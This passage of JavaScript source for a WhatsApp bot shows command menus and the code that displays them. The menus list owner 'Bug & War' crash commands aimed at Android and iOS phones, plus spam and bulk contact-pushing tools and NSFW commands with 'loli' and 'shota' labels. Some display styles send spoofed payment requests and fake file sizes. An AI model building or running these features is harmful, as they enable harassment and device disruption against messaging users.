│${setv} ${prefix}smug 🅕
│${setv} ${prefix}glomp 🅕 
│${setv} ${prefix}happy 🅕
│${setv} ${prefix}dance 🅕
│${setv} ${prefix}cringe 🅕
│${setv} ${prefix}cuddle 🅕
│${setv} ${prefix}highfive 🅕 
│${setv} ${prefix}handhold 🅕
│${setv} ${prefix}spank 🅕
│${setv} ${prefix}tickle 🅕
│${setv} ${prefix}feed 🅕
│${setv} ${prefix}checkme 🅕
│${setv} ${prefix}sound1 - sound161 🅕
╰─┬────❍
╭─┴❍「 *Sticker* 」❍
│${setv} ${prefix}goose 🅕
│${setv} ${prefix}woof 🅕
│${setv} ${prefix}8ball 🅕
│${setv} ${prefix}lizard 🅕
│${setv} ${prefix}meow 🅕
│${setv} ${prefix}gura 🅕
│${setv} ${prefix}telestick 🅕
╰─┬────❍
╭─┴❍「 *Anime* 」❍
│${setv} ${prefix}stickhandhold 🅕
│${setv} ${prefix}stickshinobu 🅕
│${setv} ${prefix}stickcuddle 🅕
│${setv} ${prefix}stickhighfive 🅕
│${setv} ${prefix}stickdance 🅕
│${setv} ${prefix}stickcringe 🅕
│${setv} ${prefix}stickhappy 🅕
│${setv} ${prefix}stickglomp 🅕
│${setv} ${prefix}sticksmug 🅕
│${setv} ${prefix}stickblush 🅕
│${setv} ${prefix}stickawoo 🅕
│${setv} ${prefix}stickwave 🅕
│${setv} ${prefix}sticksmile 🅕
│${setv} ${prefix}stickslap 🅕
│${setv} ${prefix}stickpoke 🅕
│${setv} ${prefix}stickwink 🅕
│${setv} ${prefix}stickbonk 🅕
│${setv} ${prefix}stickbully 🅕
│${setv} ${prefix}stickyeet 🅕
│${setv} ${prefix}stickbike 🅕
│${setv} ${prefix}stickkiss 🅕
│${setv} ${prefix}sticklick 🅕
│${setv} ${prefix}stickpat 🅕
│${setv} ${prefix}stickhug 🅕
│${setv} ${prefix}stickkill 🅕
│${setv} ${prefix}stickcry 🅕
│${setv} ${prefix}stickspank 🅕
│${setv} ${prefix}sticktickle 🅕
│${setv} ${prefix}traceanime 🅕
│${setv} ${prefix}akira 🅕
│${setv} ${prefix}akiyama 🅕
│${setv} ${prefix}ana 🅕
│${setv} ${prefix}asuna 🅕
│${setv} ${prefix}ayuzawa 🅕
│${setv} ${prefix}boruto 🅕
│${setv} ${prefix}chiho 🅕
│${setv} ${prefix}chitoge 🅕
│${setv} ${prefix}cosplayloli 🅕
│${setv} ${prefix}cosplaysagiri 🅕
│${setv} ${prefix}deidara 🅕
│${setv} ${prefix}doraemon 🅕
│${setv} ${prefix}elaina 🅕
│${setv} ${prefix}emilia 🅕
│${setv} ${prefix}erza 🅕
│${setv} ${prefix}gremory 🅕
│${setv} ${prefix}hestia 🅕
│${setv} ${prefix}husbu 🅕
│${setv} ${prefix}inori 🅕
│${setv} ${prefix}isuzu 🅕
│${setv} ${prefix}itachi 🅕
│${setv} ${prefix}itori 🅕
│${setv} ${prefix}kaga 🅕
│${setv} ${prefix}kagura 🅕
│${setv} ${prefix}kakasih 🅕
│${setv} ${prefix}kaori 🅕
│${setv} ${prefix}keneki 🅕
│${setv} ${prefix}kotori 🅕
│${setv} ${prefix}kurumi 🅕
│${setv} ${prefix}loli 🅕
│${setv} ${prefix}loli2 🅕
│${setv} ${prefix}madara 🅕
│${setv} ${prefix}megumin 🅕
│${setv} ${prefix}mikasa 🅕
│${setv} ${prefix}mikey 🅕
│${setv} ${prefix}miku 🅕
│${setv} ${prefix}minato 🅕
│${setv} ${prefix}naruto 🅕
│${setv} ${prefix}neko 🅕
│${setv} ${prefix}nekonime 🅕
│${setv} ${prefix}nezuko 🅕
│${setv} ${prefix}onepiece 🅕
│${setv} ${prefix}pokemon 🅕
│${setv} ${prefix}randomnime 🅕
│${setv} ${prefix}randomnime2 🅕
│${setv} ${prefix}rize 🅕
│${setv} ${prefix}sagiri 🅕
│${setv} ${prefix}sakura 🅕
│${setv} ${prefix}sasuke 🅕
│${setv} ${prefix}shina 🅕
│${setv} ${prefix}shinka 🅕
│${setv} ${prefix}shinomiya 🅕
│${setv} ${prefix}shizuka 🅕
│${setv} ${prefix}shota 🅕
│${setv} ${prefix}tejina 🅕
│${setv} ${prefix}toukachan 🅕
│${setv} ${prefix}tsunade 🅕
│${setv} ${prefix}waifu 🅕
│${setv} ${prefix}waifu2 🅕
│${setv} ${prefix}animewall 🅕
│${setv} ${prefix}yotsuba 🅕
│${setv} ${prefix}yuki 🅕
│${setv} ${prefix}yulibocil 🅕
│${setv} ${prefix}yumeko 🅕
│${setv} ${prefix}8ball 🅕
│${setv} ${prefix}animeawoo 🅕
│${setv} ${prefix}animemegumin 🅕
│${setv} ${prefix}animeshinobu 🅕
│${setv} ${prefix}animehandhold 🅕
│${setv} ${prefix}animehighfive 🅕
│${setv} ${prefix}animecringe 🅕
│${setv} ${prefix}animedance 🅕
│${setv} ${prefix}animehappy 🅕
│${setv} ${prefix}animeglomp 🅕
│${setv} ${prefix}animeblush 🅕
│${setv} ${prefix}animesmug 🅕
│${setv} ${prefix}animewave 🅕
│${setv} ${prefix}animesmille 🅕
│${setv} ${prefix}animepoke 🅕
│${setv} ${prefix}animewink 🅕
│${setv} ${prefix}animebonk 🅕
│${setv} ${prefix}animebully 🅕
│${setv} ${prefix}animeyeet 🅕
│${setv} ${prefix}animebite 🅕
│${setv} ${prefix}animelick 🅕
│${setv} ${prefix}animekill 🅕
│${setv} ${prefix}animecry 🅕
│${setv} ${prefix}animewlp 🅕
│${setv} ${prefix}animekiss 🅕
│${setv} ${prefix}animehug 🅕
│${setv} ${prefix}animeneko 🅕
│${setv} ${prefix}animepat 🅕
│${setv} ${prefix}animeslap 🅕
│${setv} ${prefix}animecuddle 🅕
│${setv} ${prefix}animewaifu 🅕
│${setv} ${prefix}animenom 🅕
│${setv} ${prefix}animefoxgirl 🅕
│${setv} ${prefix}animegecg 🅕
│${setv} ${prefix}animetickle 🅕
│${setv} ${prefix}animefeed 🅕
│${setv} ${prefix}animeavatar 🅕
│${setv} ${prefix}anime 🅕
│${setv} ${prefix}avatar 🅕
│${setv} ${prefix}shinobu 🅕
│${setv} ${prefix}fox_girl 🅕
│${setv} ${prefix}gecg 🅕
╰─┬────❍
╭─┴❍「 *Anime NSFW* 」❍
│${setv} ${prefix}hentai 🅕
│${setv} ${prefix}gifblowjob 🅕
│${setv} ${prefix}hentaivid 🅕
│${setv} ${prefix}hneko 🅕
│${setv} ${prefix}nwaifu 🅕
│${setv} ${prefix}animespank 🅕
│${setv} ${prefix}trap 🅕
│${setv} ${prefix}blowjob 🅕
│${setv} ${prefix}cuckold 🅕
│${setv} ${prefix}milf 🅕
│${setv} ${prefix}eba 🅕
│${setv} ${prefix}pussy 🅕
│${setv} ${prefix}yuri 🅕
│${setv} ${prefix}zettai 🅕
╰─┬────❍
╭─┴❍「 *Database* 」❍
│${setv} ${prefix}setcmd 🅞
│${setv} ${prefix}delcmd 🅞
│${setv} ${prefix}listcmd 🅕
│${setv} ${prefix}lockcmd 🅞
│${setv} ${prefix}addmsg 🅞
│${setv} ${prefix}delmsg 🅞
│${setv} ${prefix}getmsg 🅕
│${setv} ${prefix}listmsg 🅕
╰─┬────❍
╭─┴❍「 *Store* 」❍
│${setv} ${prefix}list 🅕
│${setv} ${prefix}store 🅕
│${setv} ${prefix}shop 🅕
│${setv} ${prefix}addlist 🅞
│${setv} ${prefix}dellist 🅞
╰─┬────❍
╭─┴❍「 *Religon* 」❍
│${setv} ${prefix}bible 🅕
│${setv} ${prefix}quran 🅕
│${setv} ${prefix}gita 🅕
╰─┬────❍
╭─┴❍「 *Bug & War* 」❍
│${setv} ${prefix}xandroid 🅞
│${setv} ${prefix}xandroid2 🅞
│${setv} ${prefix}xios 🅞
│${setv} ${prefix}xios2 🅞
│${setv} ${prefix}systemuicrash 🅞
│${setv} ${prefix}xsysui 🅞
│${setv} ${prefix}🙂 🅞
│${setv} ${prefix}ioskill 🅞
│${setv} ${prefix}onekill 🅞
│${setv} ${prefix}xgcmem 🅞
╰─┬────❍
╭─┴❍「 *Other* 」❍
│${setv} ${prefix}update 🅕
│${setv} ${prefix}ping 🅕
│${setv} ${prefix}menu 🅕
│${setv} ${prefix}myip 🅕
│${setv} ${prefix}repo 🅕
│${setv} ${prefix}reportbug 🅕
│${setv} ${prefix}idgroup 🅕
│${setv} ${prefix}owner 🅕
│${setv} ${prefix}rentbot 🅕
│${setv} ${prefix}donate 🅕
│${setv} ${prefix}runtime 🅕
│${setv} ${prefix}confess 🅕
│${setv} ${prefix}react 🅕
│${setv} ${prefix}q 🅕
│${setv} ${prefix}inspect 🅕
│${setv} ${prefix}tagme 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'ownermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Owner* 」❍
│${setv} ${prefix}addbadword 🅞
│${setv} ${prefix}delbadword 🅞
│${setv} ${prefix}autoread 🅞
│${setv} ${prefix}autobio 🅞
│${setv} ${prefix}autotype 🅞
│${setv} ${prefix}unavailable 🅞
│${setv} ${prefix}autorecord 🅞
│${setv} ${prefix}autorecordtype 🅞
│${setv} ${prefix}autoswview 🅞
│${setv} ${prefix}setautoblock 🅞
│${setv} ${prefix}setantiforeign 🅞
│${setv} ${prefix}autoblock 🅞
│${setv} ${prefix}onlygc 🅞
│${setv} ${prefix}onlypc 🅞
│${setv} ${prefix}onlyindia 🅞
│${setv} ${prefix}onlyindo 🅞
│${setv} ${prefix}anticall 🅞
│${setv} ${prefix}self 🅞
│${setv} ${prefix}public 🅞
│${setv} ${prefix}join 🅞
│${setv} ${prefix}poll 🅞
│${setv} ${prefix}spam 🅞
│${setv} ${prefix}bc 🅞
│${setv} ${prefix}bcgroup 🅞
│${setv} ${prefix}setmenu 🅞
│${setv} ${prefix}setimgmenu 🅞
│${setv} ${prefix}setvidmenu 🅞
│${setv} ${prefix}setgifmenu 🅞
│${setv} ${prefix}setreply 🅞
│${setv} ${prefix}resethit 🅞
│${setv} ${prefix}resetuser 🅞
│${setv} ${prefix}creategc 🅞
│${setv} ${prefix}setexif 🅞
│${setv} ${prefix}getexif 🅞
│${setv} ${prefix}getautoblocknumber 🅞
│${setv} ${prefix}getantiforeignnumber 🅞
│${setv} ${prefix}userjid 🅞
│${setv} ${prefix}setbotbio 🅞
│${setv} ${prefix}delppbot 🅞
│${setv} ${prefix}shutdown 🅞
│${setv} ${prefix}setppbot 🅞
│${setv} ${prefix}addprem 🅞
│${setv} ${prefix}delprem 🅞
│${setv} ${prefix}addowner 🅞
│${setv} ${prefix}delowner 🅞
│${setv} ${prefix}addvn 🅞
│${setv} ${prefix}addapk 🅞
│${setv} ${prefix}addzip 🅞
│${setv} ${prefix}addpdf 🅞
│${setv} ${prefix}delapk 🅞
│${setv} ${prefix}delzip 🅞
│${setv} ${prefix}delpdf 🅞
│${setv} ${prefix}delvn 🅞
│${setv} ${prefix}addsticker 🅞
│${setv} ${prefix}delsticker 🅞
│${setv} ${prefix}addimage 🅞
│${setv} ${prefix}delimage 🅞
│${setv} ${prefix}addvideo 🅞
│${setv} ${prefix}delvideo 🅞
│${setv} ${prefix}upswtext 🅞
│${setv} ${prefix}upswvideo 🅞
│${setv} ${prefix}upswimage 🅞
│${setv} ${prefix}upswaudio 🅞
│${setv} ${prefix}autosticker 🅞
│${setv} ${prefix}block 🅞
│${setv} ${prefix}unblock 🅞
│${setv} ${prefix}leavegc 🅞
│${setv} ${prefix}pushcontact 🅞
│${setv} ${prefix}pushcontactv2 🅞
│${setv} ${prefix}pushcontactv3 🅞
│${setv} ${prefix}jpm 🅞
│${setv} ${prefix}checkmember 🅞
│${setv} ${prefix}post 🅞
│${setv} ${prefix}clearchat 🅞
│${setv} ${prefix}setprefix 🅞
│${setv} $ 🅞
│${setv} > 🅞
│${setv} < 🅞
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'groupmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Group* 」❍
│${setv} ${prefix}antibot 🅖
│${setv} ${prefix}antiviewonce 🅖
│${setv} ${prefix}readviewonce 🅖
│${setv} ${prefix}welcome 🅖
│${setv} ${prefix}adminevent 🅖
│${setv} ${prefix}groupevent 🅖
│${setv} ${prefix}antiforeign 🅖
